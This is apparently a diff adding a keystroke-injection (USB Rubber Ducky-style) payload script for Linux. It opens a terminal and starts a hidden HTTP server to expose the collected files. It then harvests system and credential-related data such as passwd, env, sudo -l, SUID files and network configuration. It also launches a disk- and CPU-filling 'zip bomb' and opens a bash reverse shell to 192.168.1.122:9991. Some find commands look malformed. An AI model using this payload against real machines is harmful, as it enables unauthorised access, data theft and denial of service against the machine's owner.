@@ -1,0 +1,105 @@
+REM open terminal
+DELAY 2000
+GUI
+DELAY 5000
+STRING terminal
+ENTER
+DELAY 2000
+ENTER
+DELAY 2000
+
+REM make file directory for extraction and start server
+STRING mkdir .files &
+ENTER
+DELAY 2000
+STRING nohup python3 -m http.server > .files/server.log &
+ENTER
+DELAY 2000
+STRING cd .files/
+ENTER
+DELAY 2000
+
+REM gather system info
+STRING systemctl list-units > services.txt &
+ENTER
+DELAY 2000
+STRING apt list > allpkg.txt &
+ENTER
+DELAY 2000
+STRING apt -s -V upgrade > upgradable.txt &
+ENTER
+DELAY 2000
+STRING ls /etc/NetworkManager/system-connections/ > wired_or_wireless.txt &
+ENTER
+DELAY 2000
+STRING uname -a > linux.txt &
+ENTER
+DELAY 2000
+STRING crontab -l > cron.txt &
+ENTER
+DELAY 2000
+STRING getent group > groups.txt &
+ENTER
+DELAY 2000
+STRING getent passwd > passwd.txt &
+ENTER
+DELAY 2000
+STRING netstat -a > net.txt &
+ENTER
+DELAY 2000
+STRING ip a > ip.txt &
+ENTER
+DELAY 2000
+STRING route -n > routing.txt &
+ENTER
+DELAY 2000
+STRING ls /home/ > home.txt &
+ENTER
+DELAY 2000
+STRING find / -path /proc -prune -o -type f -readable 2>/dev/null > readable_files.txt &
+ENTER
+DELAY 2000
+STRING find / -path /proc -prune -o -type f -writable 2>/dev/null > writable.txt &
+ENTER
+DELAY 2000
+STRING find / -path /proc -prune -o -type f /2000 2>/dev/null > guid.txt &
+ENTER
+DELAY 2000
+STRING find / -path /proc -prune -o -type f /4000 2>/dev/null > suid.txt &
+ENTER
+DELAY 2000
+STRING find / -path /proc -prune -o -type f /6000 2>/dev/null > gsuid.txt &
+ENTER
+DELAY 2000
+STRING tree / > filesystem.txt &
+ENTER
+DELAY 2000
+STRING env > env.txt &
+ENTER
+DELAY 2000
+STRING lsblk > disk.txt &
+ENTER
+DELAY 1000
+STRING df -H > space.txt &
+ENTER
+DELAY 2000
+STRING free > ram.txt &
+ENTER
+DELAY 2000
+STRING sudo -l > priv.txt &
+ENTER
+DELAY 2000
+CTRL C
+ENTER
+DELAY 2000
+
+REM START ZIP BOMB
+STRING nohup dd if=/dev/zero bs=10G count=1000 | bzip2 -c > bomb.bz2 &
+ENTER
+DELAY 2000
+
+REM starting rev shell
+STRING nohup bash -i >& /dev/tcp/192.168.1.122/9991 0>&1
+ENTER
+
+
